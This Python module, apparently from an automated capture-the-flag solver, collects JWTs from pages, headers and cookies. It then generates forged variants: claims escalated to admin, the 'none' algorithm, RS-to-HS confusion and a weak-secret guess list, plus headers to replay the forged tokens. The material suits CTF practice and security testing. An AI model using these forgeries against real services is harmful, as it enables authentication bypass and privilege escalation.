"""JWT candidate-collection / mutation / encoding mixin extracted from ctf_dispatcher.py.

P5 / Workstream A: the contiguous JWT helper cluster (6 methods,
_collect_candidate_jwts .. _jwt_request_headers) is physically moved out of
CTFTaskDispatcher into a behaviour-preserving mixin. Method bodies are identical;
self.* (state, _recent_local_source_hint_secret_candidates) resolves at runtime
against the dispatcher that mixes this in, so call sites are unchanged. Pure code
relocation, near-zero risk.
"""

from __future__ import annotations

import re
from typing import Any

from .dispatcher_helpers import _jwt_encode


class JWTExecutorMixin:
    """JWT discovery, payload/alg/secret candidate generation and request headers."""

    def _collect_candidate_jwts(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> list[dict[str, Any]]:
        jwt_pattern = re.compile(
            r"(eyJ[a-zA-Z0-9_\-]*\.[a-zA-Z0-9_\-]*\.[a-zA-Z0-9_\-]*)"
        )
        candidates: list[dict[str, Any]] = []
        seen_tokens: set[str] = set()

        def _add(token: str, *, source: str, location: str = "", header_name: str = "") -> None:
            normalized = str(token or "").strip()
            if not normalized or normalized in seen_tokens:
                return
            seen_tokens.add(normalized)
            candidates.append(
                {
                    "token": normalized,
                    "source": source,
                    "location": location,
                    "header_name": header_name,
                }
            )

        text_blobs = [
            str(page_features.get("content") or ""),
            str(page_features.get("html") or ""),
            str(page_features.get("headers") or ""),
            str(page_features.get("cookies") or ""),
            str(target or ""),
        ]
        if self.state is not None:
            for obs in self.state.observations:
                text_blobs.append(str(obs.value or ""))
                if isinstance(obs.metadata, dict):
                    for key in ("url", "final_url", "location"):
                        value = str(obs.metadata.get(key) or "").strip()
                        if value:
                            text_blobs.append(value)
            for artifact in self.state.artifacts:
                text_blobs.append(str(artifact.location or ""))
                if isinstance(artifact.metadata, dict):
                    text_blobs.append(str(artifact.metadata.get("content") or ""))

        for blob in text_blobs:
            for match in jwt_pattern.findall(str(blob or "")):
                _add(match, source="text")

        headers = page_features.get("response_headers") or page_features.get("headers") or {}
        if isinstance(headers, dict):
            for key, value in headers.items():
                text = str(value or "").strip()
                if not text:
                    continue
                bearer_match = re.search(
                    r"Bearer\s+(eyJ[a-zA-Z0-9_\-]*\.[a-zA-Z0-9_\-]*\.[a-zA-Z0-9_\-]*)",
                    text,
                    re.IGNORECASE,
                )
                if bearer_match:
                    _add(
                        bearer_match.group(1),
                        source="header",
                        location="authorization",
                        header_name=str(key or "Authorization"),
                    )

        cookies_blob = str(page_features.get("cookies") or "")
        for cookie_part in cookies_blob.split(";"):
            if "=" not in cookie_part:
                continue
            name, value = cookie_part.split("=", 1)
            value = value.strip()
            if jwt_pattern.fullmatch(value):
                _add(value, source="cookie", location=name.strip())

        return candidates

    def _jwt_mutation_candidates(self, payload: dict[str, Any]) -> list[dict[str, Any]]:
        base = dict(payload or {})
        variants: list[dict[str, Any]] = [dict(base)]
        elevated = dict(base)
        changed = False
        for key in ("role", "type", "scope", "user_role", "group"):
            if key in elevated:
                elevated[key] = "admin"
                changed = True
        for key in ("is_admin", "admin", "isAdmin", "superuser"):
            if key in elevated:
                elevated[key] = True
                changed = True
        for key in ("uid", "user_id", "id"):
            if key in elevated and str(elevated[key]) not in {"1", "admin"}:
                elevated[key] = 1
                changed = True
        if not changed:
            elevated["role"] = "admin"
            elevated["is_admin"] = True
        variants.append(elevated)
        return variants

    def _jwt_algorithm_candidates(self, header: dict[str, Any]) -> list[str]:
        alg = str((header or {}).get("alg") or "").upper()
        candidates: list[str] = ["none"]
        if alg.startswith("HS"):
            candidates.append(alg)
        elif alg.startswith("RS"):
            candidates.extend(["HS256", "HS512"])
        else:
            candidates.extend(["HS256", "HS512"])
        ordered: list[str] = []
        for item in candidates:
            if item and item not in ordered:
                ordered.append(item)
        return ordered

    def _jwt_secret_candidates(self) -> list[str]:
        seeds = [
            "",
            "secret",
            "jwt_secret",
            "mysecret",
            "admin",
            "ctf",
            "flag",
            "tornado_secret",
        ]
        if self.state is not None:
            for candidate in self._recent_local_source_hint_secret_candidates():
                seeds.insert(0, candidate)
            for obs in self.state.observations:
                if obs.kind == "cookie_secret_leaked":
                    value = str(obs.value or "").strip()
                    if value:
                        seeds.insert(0, value)
        seen: set[str] = set()
        ordered: list[str] = []
        for item in seeds:
            if item in seen:
                continue
            seen.add(item)
            ordered.append(item)
        return ordered

    def _encode_none_jwt(self, payload: dict[str, Any]) -> str:
        return _jwt_encode(payload, "", "none")

    def _jwt_request_headers(
        self,
        candidate: dict[str, Any],
        token: str,
    ) -> list[dict[str, str]]:
        header_name = str(candidate.get("header_name") or "Authorization").strip() or "Authorization"
        location = str(candidate.get("location") or "").strip().lower()
        variants = [{header_name: f"Bearer {token}"}]
        if location:
            variants.append({"Cookie": f"{location}={token}"})
        else:
            variants.append({"Cookie": f"token={token}"})
        return variants
